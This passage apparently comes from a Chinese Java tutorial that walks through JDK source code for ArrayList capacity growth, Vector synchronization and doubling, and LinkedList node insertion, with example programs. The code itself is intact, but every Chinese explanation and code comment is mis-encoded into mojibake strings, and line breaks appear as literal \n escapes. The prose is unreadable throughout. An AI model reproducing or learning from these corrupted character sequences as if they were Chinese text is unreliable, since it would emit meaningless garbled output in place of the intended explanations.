å™¨åˆ›å»ºArrayList å¯¹è±¡\n        ArrayList list = new ArrayList();\n\t\t\t\t\n        //ä½¿ç”¨for ç»™list é›†åˆæ·»åŠ 1-10 æ•°æ®\n        for (int i = 1; i <= 10; i++) {\n            list.add(i);\n        }\n        //ä½¿ç”¨for ç»™list é›†åˆæ·»åŠ 11-15 æ•°æ®\n        for (int i = 11; i <= 15; i++) {\n            list.add(i);\n        }\n    }\n}\n```\n\n###### Step1\n\næ‰§è¡Œ`ArrayList list = new ArrayList();`\n\n```java\n//è¯¥æ­¥éª¤åº•å±‚ä»£ç \nprivate static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = {};\ntransient Object[] elementData;\n\npublic ArrayList() {\n  this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;\n}\n```\n\næ‰§è¡Œæ—¶ä¼šè°ƒç”¨æ— å‚æ•°æ„é€ æ–¹æ³•åˆ›å»º  ArrayList  ï¼Œå®é™…ä¸Šåˆ›å»ºäº†ä¸€ä¸ªåä¸º`elementData` çš„`Object[]` ç©ºæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥æ•°ç»„å¯ä»¥æ”¾ä»»ä½•å¯¹è±¡\n\n###### Step2\n\næ‰§è¡Œ `  for (int i = 1; i <= 10; i++) {list.add(i);}`\n\n```java\n//è¯¥æ­¥éª¤åº•å±‚ä»£ç \nprivate int size;// å½“å‰æ•°ç»„æ‰€åŒ…å«çš„å…ƒç´ ä¸ªæ•°\npublic boolean add(E e) {\n  ensureCapacityInternal(size + 1);  \n  elementData[size++] = e;\n  return true;\n}\n```\n\næ·»åŠ å…ƒç´ ä¹‹å‰ï¼Œå…ˆè°ƒç”¨ `ensureCapacityInternal` æ–¹æ³•\n\n```java\n//å¾—åˆ°æœ€å°æ‰©å®¹é‡\nprivate void ensureCapacityInternal(int minCapacity) {\n    ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));\n}\n\n//è®¡ç®—æœ€å°æ‰©å®¹é‡\nprivate static int calculateCapacity(Object[] elementData, int minCapacity) {\n     // å¦‚æœå…ƒç´ æ•°ç»„ä¸ºé»˜è®¤çš„ç©º\n    if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) {\n        // è·å–â€œé»˜è®¤çš„å®¹é‡â€å’Œâ€œä¼ å…¥å‚æ•° minCapacity â€ä¸¤è€…ä¹‹é—´çš„æœ€å¤§å€¼\n        return Math.max(DEFAULT_CAPACITY, minCapacity);\n    }\n    return minCapacity;\n}\n```\n\nå½“è¦ add è¿›ç¬¬ 1 ä¸ªå…ƒç´ æ—¶ï¼ŒminCapacity ä¸º 1ï¼ŒDEFAULT_CAPACITY ä¸º 10ï¼Œåœ¨ Math.max() æ–¹æ³•æ¯”è¾ƒåï¼ŒminCapacity ä¸º 10ï¼Œç„¶åè°ƒç”¨ `ensureExplicitCapacity` æ–¹æ³•\n\n```java\n//åˆ¤æ–­æ˜¯å¦éœ€è¦æ‰©å®¹\nprivate void ensureExplicitCapacity(int minCapacity) {\n        modCount++;//è®°å½•ä¿®æ”¹æ¬¡æ•°\n        if (minCapacity - elementData.length > 0)\n            grow(minCapacity);\n}\n```\n\nå½“è¦ add è¿›ç¬¬ 1 ä¸ªå…ƒç´ æ—¶ï¼Œ`elementData.length = 0` ï¼ˆå› ä¸ºè¿˜æ˜¯ä¸€ä¸ªç©ºçš„ listï¼‰ï¼Œå› ä¸ºä¸Šæ­¥éª¤æ‰§è¡Œäº† ensureCapacityInternal()  æ–¹æ³• ï¼Œæ‰€ä»¥ `minCapacity = 10`ã€‚æ­¤æ—¶ï¼Œ`minCapacity - elementData.length > 0`æˆç«‹ï¼Œæ‰€ä»¥**ä¼šæ‰§è¡Œ** `grow()` æ–¹æ³•ã€‚\n\n```java\n//æ‰©å®¹æ–¹æ³•\nprivate void grow(int minCapacity) {\n  // å–åˆ°æ—§æ•°ç»„çš„é•¿åº¦\n  int oldCapacity = elementData.length;\n  //è®¡ç®—æ–°æ•°ç»„çš„é•¿åº¦\n  //>>æ˜¯ç§»ä½è¿ç®—ç¬¦ï¼Œç›¸å½“äºint newCapacity = oldCapacity + (oldCapacity/2)ï¼Œä½†æ€§èƒ½ä¼šå¥½ä¸€äº›\n  int newCapacity = oldCapacity + (oldCapacity >> 1);\n  //ä¿è¯é•¿åº¦åœ¨æ­£å¸¸èŒƒå›´å†…\n  if (newCapacity - minCapacity < 0)\n    newCapacity = minCapacity;\n  if (newCapacity - MAX_ARRAY_SIZE > 0)\n    newCapacity = hugeCapacity(minCapacity);\n  // ç”¨è®¡ç®—å‡ºæ¥çš„æ•°ç»„é•¿åº¦,å¾€ä¸‹ä¼ ç»§ç»­å¤„ç†\n  elementData = Arrays.copyOf(elementData, newCapacity);\n}\n```\n\næ­¤æ—¶ oldCapacity ä¸º 0ï¼Œç»æ¯”è¾ƒåç¬¬ä¸€ä¸ª if åˆ¤æ–­æˆç«‹ï¼ŒnewCapacity =  10ã€‚ä½†æ˜¯ç¬¬äºŒä¸ª if åˆ¤æ–­ä¸ä¼šæˆç«‹ï¼Œå³ newCapacity ä¸æ¯” MAX_ARRAY_SIZE å¤§ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ `hugeCapacity` æ–¹æ³•ã€‚ç„¶åè°ƒç”¨ `Arrays.copyOf()` æ–¹æ³•è¿›è¡Œæ‰©å®¹ï¼Œæ•°ç»„æ‰©å®¹ä¸º 10ï¼Œadd æ–¹æ³•ä¸­ return true,size å¢ä¸º 1ã€‚\n\n- å½“ add ç¬¬ 2 ä¸ªå…ƒç´ æ—¶ï¼ŒminCapacity ä¸º 2ï¼Œæ­¤æ—¶ elementData.length åœ¨æ·»åŠ ç¬¬ä¸€ä¸ªå…ƒç´ åæ‰©å®¹æˆ 10 äº†ã€‚æ­¤æ—¶ï¼Œ`minCapacity - elementData.length > 0` ä¸æˆç«‹ï¼Œæ‰€ä»¥`ä¸ä¼šæ‰§è¡Œ grow()` æ–¹æ³•ã€‚\n\n- æ·»åŠ ç¬¬ 3ã€4Â·Â·Â·åˆ°ç¬¬ 10 ä¸ªå…ƒç´ æ—¶ï¼Œä¾ç„¶`ä¸ä¼šæ‰§è¡Œ grow()` æ–¹æ³•ï¼Œæ•°ç»„å®¹é‡éƒ½ä¸º 10ã€‚\n\n- ç›´åˆ°æ·»åŠ ç¬¬ 11 ä¸ªå…ƒç´ ï¼ŒminCapacity(ä¸º 11)æ¯” elementData.lengthï¼ˆä¸º 10ï¼‰è¦å¤§ã€‚è¿›å…¥ grow () æ–¹æ³•è¿›è¡Œæ‰©å®¹\n\n###### Step3\n\næ‰§è¡Œ `  for (int i = 11; i <= 15; i++) {list.add(i);}`\n\n- å½“ add ç¬¬ 11 ä¸ªå…ƒç´ è¿›å…¥ grow() æ–¹æ³•æ—¶ï¼ŒnewCapacity ä¸º 15ï¼Œæ¯” minCapacity ä¸º 11å¤§ï¼Œç¬¬ä¸€ä¸ª if åˆ¤æ–­ä¸æˆç«‹ã€‚æ–°å®¹é‡æ²¡æœ‰å¤§äºæ•°ç»„æœ€å¤§ sizeï¼Œä¸ä¼šè¿›å…¥ hugeCapacity æ–¹æ³•ã€‚æ‰©å®¹ elementData ä¸º 1.5 å€ï¼Œæ•°ç»„å®¹é‡æ‰©ä¸º 15ï¼Œadd æ–¹æ³•ä¸­ return trueï¼Œsize å¢ä¸º 11ã€‚\n\n- ä»¥æ­¤ç±»æ¨Â·Â·Â·Â·Â·Â·\n\n##### æ¡ˆä¾‹2ï¼šæœ‰å‚æ„é€ å‡½æ•°\n\n```java\npackage com.jwt.list_;\nimport java.util.ArrayList;\n\npublic class ArrayListSource {\n    public static void main(String[] args) {\n        //ä½¿ç”¨æœ‰å‚æ„é€ å™¨åˆ›å»ºArrayList å¯¹è±¡\n\t\t\t\tArrayList list = new ArrayList(8);\n      \n        //ä½¿ç”¨for ç»™list é›†åˆæ·»åŠ 1-10 æ•°æ®\n        for (int i = 1; i <= 10; i++) {\n            list.add(i);\n        }\n        //ä½¿ç”¨for ç»™list é›†åˆæ·»åŠ 11-15 æ•°æ®\n        for (int i = 11; i <= 15; i++) {\n            list.add(i);\n        }\n        list.add(100);\n        list.add(200);\n        list.add(null);\n    }\n}\n```\n\næœ‰å‚æ„é€ ä¸ä¸Šé¢æ— å‚æ„é€ ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºç¬¬ä¸€æ­¥ï¼Œæœ‰å‚æ„é€ æ˜¯ä»¥ä¼ å…¥çš„å‚æ•°åˆ›å»ºäº†ä¸€ä¸ªåä¸º`elementData` çš„`Object[æŒ‡å®šå¤§å°]` ç©ºæ•°ç»„ ï¼Œå¦‚æœéœ€è¦æ‰©å®¹ï¼Œä¹Ÿæ˜¯è°ƒç”¨æ— å‚æ„é€ ç›¸åŒçš„æ–¹æ³•æ¥è¿›è¡Œæ‰©å®¹ï¼Œç¬¬ä¸€æ¬¡æ‰©å®¹å°±æŒ‰ç…§ elementData çš„ 1.5 å€æ‰©å®¹\n\n## 1.2 Vector\n\n### ç‰¹ç‚¹\n\n```java\npublic class Vector<E>\n    extends AbstractList<E>\n    implements List<E>, RandomAccess, Cloneable, java.io.Serializable{}\n```\n\n- Vector åº•å±‚ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡æ•°ç»„\n  - `protected Object[] elementData;`\n\n- Vectoræ˜¯çº¿ç¨‹åŒæ­¥çš„ï¼Œå³çº¿ç¨‹å®‰å…¨ï¼ŒVector ç±»çš„æ“ä½œæ–¹æ³•å¸¦æœ‰ synchronized\n\n  ```java\n  public synchronized boolean add(E e) {\n    modCount++;\n    ensureCapacityHelper(elementCount + 1);\n    elementData[elementCount++] = e;\n    return true;\n  }\n  ```\n\n- éœ€è¦çº¿ç¨‹åŒæ­¥å®‰å…¨æ˜¯ï¼Œè€ƒè™‘ä½¿ç”¨\n\n### æ‰©å®¹æœºåˆ¶\n\n#### ç»“è®º\n\n- 1ã€åˆ›å»º Vector å¯¹è±¡æ—¶ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯æ— å‚æ„é€ å™¨ï¼Œåˆ™åˆå§‹ elementData å®¹é‡ä¸º 0\n  - ç¬¬ 1 æ¬¡æ·»åŠ ï¼Œåˆ™æ‰©å®¹ elementData ä¸º 10\n  - å¦‚éœ€å†æ¬¡æ‰©å®¹ï¼Œåˆ™æ‰©å®¹ elementData ä¸º 2 å€\n- 2ã€åˆ›å»º Vector å¯¹è±¡æ—¶ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯æŒ‡å®šå¤§å°çš„æ„é€ å™¨ï¼Œåˆ™åˆå§‹ elementData å®¹é‡ä¸ºæŒ‡å®šå¤§å°\n  - å¦‚æœéœ€è¦æ‰©å®¹ï¼Œåˆ™ç›´æ¥æ‰©å®¹ elementData ä¸º 2å€\n- 3ã€åˆ›å»º Vector å¯¹è±¡æ—¶ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯æŒ‡å®šå¤§å°å’Œå¢é‡çš„æ„é€ å™¨(è‡ªå®šä¹‰æ‰©å®¹)ï¼Œåˆ™åˆå§‹ elementData å®¹é‡ä¸ºæŒ‡å®šå¤§å°\n  - å¦‚æœéœ€è¦æ‰©å®¹ï¼Œåˆ™ç›´æ¥æ‰©å®¹åŸå®¹é‡+å®¹é‡å¢é‡\n\n#### æ„é€ å‡½æ•°\n\n```java\npublic Vector(int initialCapacity, int capacityIncrement) {\n  super();\n  if (initialCapacity < 0)\n    throw new IllegalArgumentException(\"Illegal Capacity: \"+\n                                       initialCapacity);\n  this.elementData = new Object[initialCapacity];\n  this.capacityIncrement = capacityIncrement;\n}\n\npublic Vector(int initialCapacity) {\n  this(initialCapacity, 0);//0ä»£è¡¨å®¹é‡å¢é‡\n}\n\n\npublic Vector() {\n  this(10);\n}\n\npublic Vector(Collection<? extends E> c) {\n  Object[] a = c.toArray();\n  elementCount = a.length;\n  if (c.getClass() == ArrayList.class) {\n    elementData = a;\n  } else {\n    elementData = Arrays.copyOf(a, elementCount, Object[].class);\n  }\n}\n```\n\n#### æ‰©å®¹æ–¹æ³•\n\n##### add\n\n```java\npublic synchronized boolean add(E e) {\n  modCount++;\n  ensureCapacityHelper(elementCount + 1);\n  elementData[elementCount++] = e;\n  return true;\n}\n```\n\n##### ensureCapacityHelper\n\n```java\nprivate void ensureCapacityHelper(int minCapacity) {\n  // overflow-conscious code\n  if (minCapacity - elementData.length > 0)\n    grow(minCapacity);\n}\n```\n\nåˆ¤æ–­æœ€å°å®¹é‡æ˜¯å¦è¶…å‡º elementData æ•°ç»„çš„é•¿åº¦ï¼Œå¦‚æœè¶…å‡ºå°±è°ƒç”¨ grow() è¿›è¡Œæ‰©å®¹\n\n##### grow\n\n```java\nprivate void grow(int minCapacity) {\n  // overflow-conscious code\n  int oldCapacity = elementData.length;\n  int newCapacity = oldCapacity + ((capacityIncrement > 0) ?\n                                   capacityIncrement : oldCapacity);\n  if (newCapacity - minCapacity < 0)\n    newCapacity = minCapacity;\n  if (newCapacity - MAX_ARRAY_SIZE > 0)\n    newCapacity = hugeCapacity(minCapacity);\n  elementData = Arrays.copyOf(elementData, newCapacity);\n}\n```\n\n- capacityIncrement æœªæŒ‡å®šçš„è¯ï¼Œæ–°å®¹é‡å°±ä¸ºåŸå®¹é‡çš„ 2 å€\n- capacityIncrement æŒ‡å®šçš„è¯ï¼Œæ–°å®¹é‡å°±ä¸ºåŸå®¹é‡+å®¹é‡å¢é‡\n\n### Vectorå’ŒArrayListå¯¹æ¯”\n\n|           | åº•å±‚ç»“æ„ | ç‰ˆæœ¬   | çº¿ç¨‹å®‰å…¨/æ•ˆç‡  | æ‰©å®¹å€æ•°                                                     |\n| --------- | -------- | ------ | -------------- | ------------------------------------------------------------ |\n| ArrayList | å¯å˜æ•°ç»„ | Jdk1.2 | ä¸å®‰å…¨ã€æ•ˆç‡é«˜ | å¦‚æœæ— å‚æ„é€ ç¬¬ä¸€æ¬¡10ï¼Œç¬¬äºŒæ¬¡1.5å€ï¼›å¦‚æœæœ‰å‚æ•°æ„é€ æŒ‰1.5å€æ‰©   |\n| Vector    | å¯å˜æ•°ç»„ | Jdk1.0 | å®‰å…¨ã€æ•ˆç‡ä¸é«˜ | å¦‚æœæ— å‚æ„é€ é»˜è®¤10ï¼Œç¬¬äºŒæ¬¡2å€ï¼›å¦‚æœæœ‰å‚æ•°æ„é€ æŒ‰2å€æ‰©ï¼›å¦‚æœæŒ‡å®šå¢é‡æŒ‰å¢é‡æ‰© |\n\n## 1.3 LinkedList\n\n###  ç‰¹ç‚¹\n\n![](https://img.jwt1399.top/img/202208232322266.png)\n\n```java\npublic class LinkedList<E>\n    extends AbstractSequentialList<E>\n    implements List<E>, Deque<E>, Cloneable, java.io.Serializable\n```\n\n- LinkedListåº•å±‚å®ç°äº†åŒå‘é“¾è¡¨å’ŒåŒç«¯é˜Ÿåˆ—ç‰¹ç‚¹ï¼Œå’Œ Deque æ¥å£\n- å¯ä»¥æ·»åŠ ä»»æ„å…ƒç´ (å…ƒç´ å¯ä»¥é‡å¤)ï¼ŒåŒ…æ‹¬ null\n- çº¿ç¨‹ä¸å®‰å…¨ï¼Œæ²¡æœ‰å®ç°åŒæ­¥\n\næ¨¡æ‹Ÿä¸€ä¸ªç®€å•çš„åŒå‘é“¾è¡¨\n\n```java\n//å®šä¹‰ä¸€ä¸ªNode ç±»ï¼ŒNode å¯¹è±¡è¡¨ç¤ºåŒå‘é“¾è¡¨çš„ä¸€ä¸ªç»“ç‚¹\nclass Node {\n    public Object item; //çœŸæ­£å­˜æ”¾æ•°æ®\n    public Node next; //æŒ‡å‘åä¸€ä¸ªç»“ç‚¹\n    public Node pre; //æŒ‡å‘å‰ä¸€ä¸ªç»“ç‚¹\n\n    public Node(Object name) {\n        this.item = name;\n    }\n    public String toString() {\n        return \"Node name=\" + item;\n    }\n}\n```\n\nä½¿ç”¨åŒå‘é“¾è¡¨\n\n```java\npackage com.jwt.list_;\n\npublic class LinkedList01 {\n    public static void main(String[] args) {\n        //æ¨¡æ‹Ÿä¸€ä¸ªç®€å•çš„åŒå‘é“¾è¡¨\n        Node jack = new Node(\"jack\");\n        Node tom = new Node(\"tom\");\n        Node jwt = new Node(\"jwt\");\n        //è¿æ¥ä¸‰ä¸ªç»“ç‚¹ï¼Œå½¢æˆåŒå‘é“¾è¡¨\n        //jack -> tom -> jwt\n        jack.next = tom;\n        tom.next = jwt;\n        //jwt -> tom -> jack\n        jwt.pre = tom;\n        tom.pre = jack;\n        Node first = jack; //è®©first å¼•ç”¨æŒ‡å‘jack,å°±æ˜¯åŒå‘é“¾è¡¨çš„å¤´ç»“ç‚¹\n        Node last = jwt; //è®©last å¼•ç”¨æŒ‡å‘jwt,å°±æ˜¯åŒå‘é“¾è¡¨çš„å°¾ç»“ç‚¹\n        //ä»å¤´åˆ°å°¾è¿›è¡Œéå†\n        System.out.println(\"===ä»å¤´åˆ°å°¾è¿›è¡Œéå†===\");\n        while (true) {\n            if (first == null) {\n                break;\n            }\n            //è¾“å‡ºfirst ä¿¡æ¯\n            System.out.println(first);\n            first = first.next;\n        }\n        //ä»å°¾åˆ°å¤´çš„éå†\n        System.out.println(\"===ä»å°¾åˆ°å¤´çš„éå†===\");\n        while (true) {\n            if (last == null) {\n                break;\n            }\n            //è¾“å‡ºlast ä¿¡æ¯\n            System.out.println(last);\n            last = last.pre;\n        }\n        //é“¾è¡¨çš„æ·»åŠ å¯¹è±¡/æ•°æ®ï¼Œæ˜¯å¤šä¹ˆçš„æ–¹ä¾¿\n        //è¦æ±‚ï¼Œæ˜¯åœ¨tom--jwtä¹‹é—´ï¼Œæ’å…¥ä¸€ä¸ªå¯¹è±¡smith\n        //1. å…ˆåˆ›å»ºä¸€ä¸ªNode ç»“ç‚¹ï¼Œname å°±æ˜¯smith\n        Node smith = new Node(\"smith\");\n        //ä¸‹é¢å°±æŠŠsmith åŠ å…¥åˆ°åŒå‘é“¾è¡¨äº†\n        smith.next = jwt;\n        smith.pre = tom;\n        jwt.pre = smith;\n        tom.next = smith;\n        //è®©first å†æ¬¡æŒ‡å‘jack\n        first = jack;//è®©first å¼•ç”¨æŒ‡å‘jack,å°±æ˜¯åŒå‘é“¾è¡¨çš„å¤´ç»“ç‚¹\n        System.out.println(\"===ä»å¤´åˆ°å°¾è¿›è¡Œéå†===\");\n        while (true) {\n            if (first == null) {\n                break;\n            }\n            //è¾“å‡ºfirst ä¿¡æ¯\n            System.out.println(first);\n            first = first.next;\n        }\n        last = jwt; //è®©last é‡æ–°æŒ‡å‘æœ€åä¸€ä¸ªç»“ç‚¹\n        //ä»å°¾åˆ°å¤´çš„éå†\n        System.out.println(\"===ä»å°¾åˆ°å¤´çš„éå†===\");\n        while (true) {\n            if (last == null) {\n                break;\n            }\n            //è¾“å‡ºlast ä¿¡æ¯\n            System.out.println(last);\n            last = last.pre;\n        }\n    }\n}\n```\n\n### å¢åˆ æ”¹æŸ¥ä½¿ç”¨\n\n```java\npackage com.jwt.list_;\n\nimport java.util.Iterator;\nimport java.util.LinkedList;\n\npublic class LinkedListCRUD {\n    public static void main(String[] args) {\n        LinkedList linkedList = new LinkedList();\n        linkedList.add(1);\n        linkedList.add(2);\n        linkedList.add(3);\n        linkedList.add(4);\n        linkedList.add(4,5);\n        System.out.println(\"linkedList=\" + linkedList);\n        //æ¼”ç¤ºä¸€ä¸ªåˆ é™¤ç»“ç‚¹çš„\n        linkedList.remove(); //é»˜è®¤åˆ é™¤çš„æ˜¯ç¬¬ä¸€ä¸ªç»“ç‚¹\n        linkedList.remove(2);//åˆ é™¤ç´¢å¼•ä¸º2çš„ç»“ç‚¹\n        System.out.println(\"linkedList=\" + linkedList);\n        //ä¿®æ”¹æŸä¸ªç»“ç‚¹å¯¹è±¡\n        linkedList.set(1, 999);\n        System.out.println(\"linkedList=\" + linkedList);\n        //å¾—åˆ°æŸä¸ªç»“ç‚¹å¯¹è±¡\n        Object o = linkedList.get(1);//å¾—åˆ°åŒå‘é“¾è¡¨çš„ç¬¬äºŒä¸ªå¯¹è±¡\n        System.out.println(o);//999\n        //å› ä¸ºLinkedList æ˜¯å®ç°äº†List æ¥å£, éå†æ–¹å¼\n        System.out.println(\"===LinkeList éå†è¿­ä»£å™¨====\");\n        Iterator iterator = linkedList.iterator();\n        while (iterator.hasNext()) {\n            Object next = iterator.next();\n            System.out.println(\"next=\" + next);\n        }\n        System.out.println(\"===LinkeList éå†å¢å¼ºfor====\");\n        for (Object o1 : linkedList) {\n            System.out.println(\"o1=\" + o1);\n        }\n        System.out.println(\"===LinkeList éå†æ™®é€šfor====\");\n        for (int i = 0; i < linkedList.size(); i++) {\n            System.out.println(linkedList.get(i));\n        }\n    }\n}\n```\n\n### æºç é˜…è¯»\n\n- LinkedList åº•å±‚ç»´æŠ¤äº†ä¸€ä¸ªåŒå‘é“¾è¡¨\n\n- LinkedList ä¸­ç»´æŠ¤äº†ä¸¤ä¸ªå±æ€§ first å’Œ last åˆ†åˆ«æŒ‡å‘é¦–èŠ‚ç‚¹å’Œå°¾èŠ‚ç‚¹\n- æ¯ä¸ªç»“ç‚¹(Nodeå¯¹è±¡)ï¼Œé‡Œé¢åˆç»´æŠ¤äº† prevã€ nextã€ item ä¸‰ä¸ªå±æ€§ï¼Œå…¶ä¸­é€šè¿‡ prev æŒ‡å‘å‰ä¸€ä¸ªï¼Œé€šè¿‡ next æŒ‡å‘åä¸€ä¸ªèŠ‚ç‚¹ï¼Œæœ€ç»ˆå®ç°åŒå‘é“¾è¡¨ã€‚\n- LinkedList çš„å…ƒç´ çš„æ·»åŠ å’Œåˆ é™¤ï¼Œä¸æ˜¯é€šè¿‡æ•°ç»„å®Œæˆçš„ï¼Œç›¸å¯¹æ¥è¯´æ•ˆç‡è¾ƒé«˜ã€‚\n\n#### æ•°æ®ç»“æ„\n\n```java\n// å…ƒç´ ä¸ªæ•°\ntransient int size = 0;\n// é“¾è¡¨å¤´èŠ‚ç‚¹\ntransient Node<E> first;\n// é“¾è¡¨å°¾èŠ‚ç‚¹\ntransient Node<E> last;\n\n//é“¾è¡¨èŠ‚ç‚¹ç»“æ„\nprivate static class Node<E> {\n  //æ•°æ®\n  E item;\n  // å‰é©±ï¼Œåç»§æŒ‡é’ˆ\n  Node<E> next;\n  Node<E> prev;\n  // æ„é€ å‡½æ•°\n  Node(Node<E> prev, E element, Node<E> next) {\n    this.item = element;\n    this.next = next;\n    this.prev = prev;\n  }\n}\n```\n\n#### æ„é€ å‡½æ•°\n\n```java\n//æ— å‚æ„é€ \npublic LinkedList() {\n}\n\n//å¸¦Collectionå¯¹è±¡æ„é€ å‡½æ•°\npublic LinkedList(Collection<? extends E> c) {\n  this();\n  addAll(c);\n}\n```\n\n#### å¢åŠ ç»“ç‚¹\n\n##### å¢åŠ å•ä¸ªç»“ç‚¹\n\n```java\n//é»˜è®¤å¢åŠ \npublic boolean add(E e) {\n  linkLast(e);//è°ƒç”¨å¢åŠ å°¾ç»“ç‚¹æ–¹æ³•\n  return true;\n}\n\n//æ ¹æ®ç´¢å¼•å¢åŠ \npublic void add(int index, E element) {\n  //åˆ¤æ–­ä¸‹æ ‡æ˜¯å¦è¶Šç•Œï¼Œè¶Šç•Œå°±æŠ›å‡ºå¼‚å¸¸\n  checkPositionIndex(index);\n  //å¦‚æœå¢åŠ ä½ç½®æ˜¯å°¾éƒ¨indexï¼Œå’Œä¸Šé¢è°ƒç”¨çš„åŒä¸€ä¸ªæ–¹æ³•\n  if (index == size)\n    linkLast(element);\n  else\n    linkBefore(element, node(index));\n}\n```\n\n##### å¢åŠ å°¾ç»“ç‚¹\n\n```java\nvoid linkLast(E e) {\n  //å¾—åˆ°å½“å‰çš„æœ€åä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹\n  final Node<E> l = last;\n  //æ„é€ æ–°èŠ‚ç‚¹ï¼Œå¹¶è®¾ç½®å½“å‰ä¸Šä¸€ä¸ªèŠ‚ç‚¹æ˜¯l,å…ƒç´ ä¸ºe,ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä¸ºnull\n  final Node<E> newNode = new Node<>(l, e, null);\n  //ç°åœ¨æœ€æ–°çš„lastèŠ‚ç‚¹ä¸ºæ–°æ’å…¥çš„èŠ‚ç‚¹\n  last = newNode;\n  //åˆ¤æ–­lèŠ‚ç‚¹æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºçš„è¯åˆ™ä»£è¡¨å½“å‰æ’å…¥çš„æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œåˆ™éœ€è¦è®¾ç½®é¦–èŠ‚ç‚¹ä¹Ÿä¸ºå½“å‰çš„æ–°èŠ‚ç‚¹ï¼Œåä¹‹åˆ™è®¾ç½®åŸå…ˆçš„æœ€åä¸€ä¸ªèŠ‚ç‚¹çš„nextèŠ‚ç‚¹æ˜¯å½“å‰æ–°çš„èŠ‚ç‚¹\n  if (l == null)\n    first = newNode;\n  else\n    l.next = newNode;\n  //å…ƒç´ æ•°é‡+1    \n  size++;\n  //é“¾è¡¨æ”¹åŠ¨æ¬¡æ•°+1\n  modCount++;\n}\n```\n\n##### å¢åŠ å¤´ç»“ç‚¹\n\n```java\nprivate void linkFirst(E e) {\n    final Node<E> f = first;\n    // åˆ›å»ºæ–°èŠ‚ç‚¹ï¼Œåç»§ä¸ºåŸå¤´èŠ‚ç‚¹\n    final Node<E> newNode = new Node<>(null, e, f);\n    first = newNode;\n    // è‹¥ä¹‹å‰é“¾è¡¨ä¸ºç©ºï¼Œè®¾ç½® last\n    if (f == null)\n        last = newNode;\n    else\n        f.prev = newNode;\n    size++;\n    modCount++;\n}\n```\n\n##### å¢åŠ ä¸­é—´ç»“ç‚¹\n\n```java\nvoid linkBefore(E e, Node<E> succ) {\n  // assert succ != null;\n  //å¾—åˆ°indexä¸‹æ ‡èŠ‚ç‚¹çš„å‰ä¸€ä¸ª\n  final Node<E> pred = succ.prev;\n  //æ„é€ æ–°èŠ‚ç‚¹ï¼Œæ–°èŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹ä¸ºåŸå…ˆè¿™ä¸ªindexä½ç½®çš„å‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè®¾ç½®æ–°èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä¸ºåŸå…ˆindexèŠ‚ç‚¹\n  final Node<E> newNode = new Node<>(pred, e, succ);\n  //è®¾ç½®åŸå…ˆindexä½ç½®çš„èŠ‚ç‚¹çš„å‰ä¸€ä¸ªä¸ºæ–°èŠ‚ç‚¹\n  succ.prev = newNode;\n  //å¦‚æœpredèŠ‚ç‚¹ä¸ºnullï¼Œåˆ™ä»£è¡¨succæ˜¯å¤´èŠ‚ç‚¹ï¼Œç°åœ¨è®¾ç½®å¤´èŠ‚ç‚¹ä¸ºæ–°èŠ‚ç‚¹\n  if (pred == null)\n    first = newNode;\n  else\n    //å¦‚æœpredèŠ‚ç‚¹ä¸ä¸ºnullï¼Œåˆ™ä¿®æ”¹predçš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä¸ºæ–°èŠ‚ç‚¹\n    pred.next = newNode;\n  //å…ƒç´ æ•°é‡+1    \n  size++;\n  //é“¾è¡¨ä¿®æ”¹æ¬¡æ•°+1\n  modCount++;\n} \n```\n\n##### æ‰¹é‡å¢åŠ \n\n```java\npublic boolean addAll(int index, Collection<? extends E> c) {\n  //å…ˆåˆ¤æ–­ä¸‹æ ‡æ˜¯å¦è¶Šç•Œï¼Œè¶Šç•Œå°±æŠ›å‡ºå¼‚å¸¸\n  checkPositionIndex(index);\n  //å°†æ‹†å…¥çš„å…ƒç´ é›†åˆè½¬æ¢ä¸ºæ•°ç»„\n  Object[] a = c.toArray();\n  //å¾—åˆ°æ•°ç»„çš„å¤§å°\n  int numNew = a.length;\n  if (numNew == 0)\n    return false;\n  //å®šä¹‰å‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå½“å‰èŠ‚ç‚¹    \n  Node<E> pred, succ;\n  //æ‹†å…¥ä½ç½®æ˜¯sizeï¼Œå³æ¥ç€å°¾éƒ¨æ‹†å…¥\n  if (index == size) {\n    //å½“å‰èŠ‚ç‚¹æ²¡æœ‰ï¼Œå‰ä¸€ä¸ªèŠ‚ç‚¹å°±æ˜¯å½“å‰æœ€åä¸€ä¸ªèŠ‚ç‚¹\n    succ = null;\n    pred = last;\n  } else {\n    //å½“å‰èŠ‚ç‚¹å°±æ˜¯indexä½ç½®çš„èŠ‚ç‚¹ï¼Œå‰ä¸€ä¸ªèŠ‚ç‚¹ç›´æ¥æ‹¿prevè·å–\n    succ = node(index);\n    pred = succ.prev;\n  }\n  //å¿«é€Ÿforå¤„ç†å¾…æ‹†å…¥å…ƒç´ çš„æ•°ç»„\n  for (Object o : a) {\n    //å…ƒç´ è½¬æ¢\n    @SuppressWarnings(\"unchecked\") E e = (E) o;\n    //æ„å»ºæ–°èŠ‚ç‚¹çš„å‰ä¸€ä¸ªæ˜¯pred,å…ƒç´ ä¸ºeï¼Œä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä¸ºnull\n    Node<E> newNode = new Node<>(pred, e, null);\n    //å¦‚æœpredèŠ‚ç‚¹ä¸ºnullï¼Œåˆ™ä»£è¡¨åŸå…ˆindexä½ç½®çš„èŠ‚ç‚¹ä¸ºå¤´èŠ‚ç‚¹ï¼Œåˆ™éœ€è¦é‡æ–°è®¾ç½®å¤´èŠ‚ç‚¹\n    if (pred == null)\n      first = newNode;\n    else\n      